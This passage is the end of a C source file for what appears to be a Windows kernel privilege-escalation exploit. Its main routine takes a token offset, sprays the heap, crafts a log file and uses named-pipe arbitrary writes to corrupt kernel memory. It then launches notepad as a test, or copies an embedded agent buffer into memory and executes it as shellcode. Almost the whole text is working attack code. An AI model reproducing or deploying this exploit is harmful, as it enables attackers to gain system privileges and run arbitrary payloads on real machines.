		RtlCopyMemory(Payload, g_Agent, sizeof(g_Agent));
		(*(VOID(*)())Payload)();
	}
}



int main(int argc, TCHAR* argv[])
{



	if (argc != 3) {
		printf("[+] Incorrect number of arguments ... using default value 1208 and flag 1 for w11 and w10\n");
		argv[1] = (TCHAR*)"1208";
		argv[2] = (TCHAR*)"1";
	}


	token_offset = atoi((CHAR*)argv[1]);
	if (token_offset == 0) {
		printf("[+] Invalid token offset argument, must be decimal number\n");
		exit(1);
	}

	flag = atoi((CHAR*)argv[2]);
	if (flag == 0) {
		printf("[+] Invalid token offset argument, must be decimal number\n");
		exit(1);
	}

	printf("TOKEN OFFSET %x\n", token_offset);
	printf("FLAG %x\n", flag);

	InitEnvironment();
	createInitialLogFile();
	GetOffsetBetweenPools();
	craftFile();
	openFile();
	doHeapSpray();
	pipeArbitraryWriteValues();
	pipeArbitraryWrite();
	Sleep(10000);
	if (strcmp((const char*)g_Agent, "CAFECAFE") == 0) {
		WinExec("cmd /c notepad", 1);
	}
	else {
		RunPayload();
	}
	return 0;
}